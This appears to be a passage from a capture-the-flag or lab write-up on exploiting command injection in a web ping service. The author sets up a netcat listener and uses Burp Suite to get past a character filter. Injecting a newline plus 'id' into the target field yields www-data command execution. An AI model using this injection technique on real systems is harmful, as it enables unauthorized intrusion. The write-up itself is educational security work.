Seems as if the service can reach our attacker machine 
I start a netcat listener shell on port 4444 on the attack machine 
nc -lvnp 4444, I am going to ping the shell through the service and see the filtering 

After extensive testing of the inputs it seems as if the filter will not allow any special characters to be entered 
This isn't an issue as I can create a proxy and edit the request to the webpage there
After starting Burp Suite I was able to get the request 
target=10.130.84.210%3Bid

I changed it to 
target=10.130.84.210
id

Sending that to the server I was able to get 
ping: 10.130.84.210
: Name or service not known
uid=33(www-data) gid=33(www-data) groups=33(www-data)

The results of id are right there on the page meaning Burp will be my way to go if I want to enter malicious code 




